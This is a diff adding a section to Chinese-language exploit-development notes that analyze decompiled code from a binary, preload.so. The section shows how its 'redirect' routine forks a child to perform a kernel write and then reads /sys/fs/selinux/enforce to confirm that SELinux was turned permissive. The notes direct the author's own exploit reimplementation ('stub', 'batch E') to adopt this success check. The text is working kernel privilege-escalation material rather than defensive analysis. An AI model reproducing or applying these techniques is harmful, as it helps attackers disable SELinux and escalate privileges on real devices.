@@ -783,6 +783,56 @@ FUN_0024094c("GRAPH_READY width=%d fanout=%d edges=%d\n", 0x60, 0x100, 0x6000);
 两者叠加才构成完整原语。** 只移植其一会失败：只有 epoll 图而无回收槽，
 内核遍历到投毒项时无有效落点；只有回收槽而无宽链，则无从触发遍历。
 
+### 2.17 `redirect` = fork + 子进程写入；成功判据是**读回可观测后果**
+
+`annotated.c:2726`–`2745`：
+
+```c
+FUN_0021d2f8("redirect","spawn",
+             "pid=%d mode=%s target=0x%016llx timeout_s=%d", uVar6, mode, param_2, 0xf0);
+uVar4 = FUN_0021d730(uVar6, 0xf0, 1);      /* 等待子进程，超时 0xf0 = 240s */
+FUN_0021d2f8("redirect","complete",
+             "pid=%d mode=%s target=0x%016llx rc=%d elapsed_ms=%llu", ...);
+```
+
+`redirect` **不自己写**：它 fork 出子进程（`pid`），由子进程执行投递，父进程
+带 240s 超时等待并回收 `rc`。`mode` 为两态之一（由 `param_1 & 1` 选择），
+对应 §2.2 的 `pipe_flags_candidate` / `zero_byte_redirect` 两种成功模式。
+
+#### 2.17.1 独立验证：读 `/sys/fs/selinux/enforce`，而非自读回目标
+
+`selinux_zero`（Ghidra 建议名 `selinux_zero_patch`，`FUN_0021e15c`）：
+
+```c
+uVar1 = FUN_0021dfec(1, param_1);   /* redirect(attempt=1, target) → rc */
+iVar2 = FUN_0021d6c4();             /* 读 /sys/fs/selinux/enforce */
+FUN_0021d2f8("selinux_zero","attempt","attempt=%d redirect_rc=%d enforcing=%d", 1, uVar1, iVar2);
+if (iVar2 != 0) {                   /* 仍 enforcing → 重试一次 */
+    uVar1 = FUN_0021dfec(1, param_1);
+    iVar2 = FUN_0021d6c4();
+    if (iVar2 != 0) { return 0xffffffff; }   /* 两次都失败 → 放弃 */
+}
+return 0;
+```
+
+`FUN_0021d6c4()`（`annotated.c:2262`）的读法：
+
+```c
+fd = open("/sys/fs/selinux/enforce", ...);
+n  = read(fd, &c, 1);
+close(fd);
+return (n == 1) ? (c == '1') : ...;   /* '1' = 仍在 enforcing */
+```
+
+**这是本项目 stub 最缺的东西**：stub 用 `*verify == value` 自读回 —— 经由同一次写
+读回目标，无法区分「写到目标」与「写到邻居」。`preload.so` 改为检查**可观测后果**：
+写入是否真的让 SELinux 变为 permissive。
+
+⇒ **批次 E 的验收判据应据此实现**：读 `/sys/fs/selinux/enforce`，
+判定 `c != '1'`，而不是任何形式的自读回。这比 §3 批次 E 计划的
+`generation`/`refs`/`depth`/`refcount` 哨兵更直接，也无需新增 profile 字段
+（批次 B 的 4 个哨兵仍可用于诊断，但不再是验收必需）。
+
 ## 3. 真实机制（综合 §2）
 
 1. **取地址**：`direct_map_base` + `selinux_image_off` → `direct_map_alias=0xffffff80027c6960`，
